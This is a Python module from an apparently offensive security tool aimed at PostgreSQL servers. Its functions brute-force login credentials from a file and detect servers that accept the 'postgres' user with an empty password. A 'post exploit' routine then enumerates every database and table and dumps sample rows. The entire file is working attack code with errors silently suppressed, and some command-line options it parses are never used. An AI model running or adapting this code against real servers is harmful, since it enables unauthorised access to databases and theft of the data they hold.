from src.utilities.utilities import get_hosts_from_file
import psycopg

def brute_nv(hosts: list[str], creds: list[str] = [], output: str = None, threads: int = 10, timeout: int = 3, verbose: bool = False):
    vuln = {}
    
    for host in hosts:
        ip, port = host.split(":")
        for cred in creds:
            u, p = cred.split(":")

            try:
                db_params = {
                    "user": u,
                    "password": p,
                    "host": ip,
                    "port": int(port),
                }
                with psycopg.connect(**db_params) as con:
                    with con.cursor() as cur:
                        cur.execute("SELECT datname FROM pg_database;")
                        if host not in vuln:
                            vuln[host] = []
                        vuln[host].append(cred)

            except: pass
        
    if len(vuln) > 0:
        print("Valid PostgreSQL credential found:")
        for key, value in vuln.items():
            print(f"    {key}: {", ".join(value)}")

def brute_console(args):
    brute_nv(get_hosts_from_file(args.file), get_hosts_from_file(args.credential_file))

def post_nv(hosts: list[str], output: str = None, threads: int = 10, timeout: int = 3, verbose: bool = False):
    for host in hosts:
        try:
            ip, port = host.split(":")

            dbs = []
            db_params = {
                "user": "postgres",
                "password": "",
                "host": ip,
                "port": int(port),
            }
            with psycopg.connect(**db_params) as con:
                with con.cursor() as cur:
                    cur.execute("SELECT datname FROM pg_database;")
                    dbs = [record[0] for record in cur]
            for db in dbs:
                try:
                    db_params = {
                        "dbname": db,
                        "user": "postgres",
                        "password": "",
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con:
                        with con.cursor() as cur:
                            cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';")
                            print(f"DATABASE: {db}")
                            print("=======================")
                            tables = [record[0] for record in cur]
                            for table in tables:
                                try:
                                    print(table)
                                    print("-----------------------")
                                    cur.execute(f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '{table}';")
                                    columns = []
                                    for c in cur:
                                        print(f"{c[0]}: {c[1]}")
                                        columns.append(c[0])
                                    print()
                                    try:
                                        print("#######################")
                                        cur.execute(f"SELECT {", ".join(columns)} FROM {table} LIMIT 10;")
                                        for v in cur:
                                            print(v)
                                        print()
                                    except Exception as e: pass
                                    print()
                                except Exception as e: pass
                            
                                
                except Exception as e: pass
            
        except Exception as e: pass
        
def post_console(args):
    post_nv(get_hosts_from_file(args.file))

def unpassworded_nv(hosts: list[str], output: str = None, threads: int = 10, timeout: int = 3, verbose: bool = False):
    vuln = {}
    
    for host in hosts:
        try:
            ip, port = host.split(":")
            db_params = {
                "user": "postgres",
                "password": "",
                "host": ip,
                "port": int(port),
            }
            with psycopg.connect(**db_params) as con:
                with con.cursor() as cur:
                    cur.execute("SELECT datname FROM pg_database;")
                    dbs = [record[0] for record in cur]
                    vuln[host] = dbs
        except: pass
        
    if len(vuln) > 0:
        print("PostgreSQL servers that allows user postgres with empty password authentication:")
        for key, value in vuln.items():
            print(f"{key}: {", ".join(value)}")
                    
def unpassworded_console(args):
    unpassworded_nv(get_hosts_from_file(args.file), threads=args.threads, timeout=args.timeout, verbose=args.verbose)

def helper_parse(commandparser):
    parser_task1 = commandparser.add_parser("psql")
    subparsers = parser_task1.add_subparsers(dest="command")
    
    parser_default = subparsers.add_parser("default-password", help="Checks if default password is used")
    parser_default.add_argument("-f", "--file", type=str, required=True, help="input file name")
    parser_default.add_argument("--threads", default=10, type=int, help="Number of threads (Default = 10)")
    parser_default.add_argument("--timeout", default=5, type=int, help="Timeout in seconds (Default = 5)")
    parser_default.add_argument("-e", "--errors", action="store_true", help="Show Errors")
    parser_default.add_argument("-v", "--verbose", action="store_true", help="Enable verbose")
    parser_default.set_defaults(func=unpassworded_console)
    
    parser_brute = subparsers.add_parser("brute", help="Bruteforce")
    parser_brute.add_argument("-f", "--file", type=str, required=True, help="input file name")
    parser_brute.add_argument("-cf", "--credential-file", type=str, help="Credential file")
    parser_brute.add_argument("--threads", default=10, type=int, help="Number of threads (Default = 10)")
    parser_brute.add_argument("--timeout", default=5, type=int, help="Timeout in seconds (Default = 5)")
    parser_brute.add_argument("-e", "--errors", action="store_true", help="Show Errors")
    parser_brute.add_argument("-v", "--verbose", action="store_true", help="Enable verbose")
    parser_brute.set_defaults(func=brute_console)
    
    parser_post = subparsers.add_parser("post", help="Post Exploit")
    parser_post.add_argument("-f", "--file", type=str, required=True, help="input file name")
    parser_post.add_argument("-u", "--username", type=str, default="postgres", help="Username (Default = postgres)")
    parser_post.add_argument("-p", "--password", type=str, default="", help="Username (Default = '')")
    parser_post.add_argument("--threads", default=10, type=int, help="Number of threads (Default = 10)")
    parser_post.add_argument("--timeout", default=5, type=int, help="Timeout in seconds (Default = 5)")
    parser_post.add_argument("-e", "--errors", action="store_true", help="Show Errors")
    parser_post.add_argument("-v", "--verbose", action="store_true", help="Enable verbose")
    parser_post.set_defaults(func=post_console)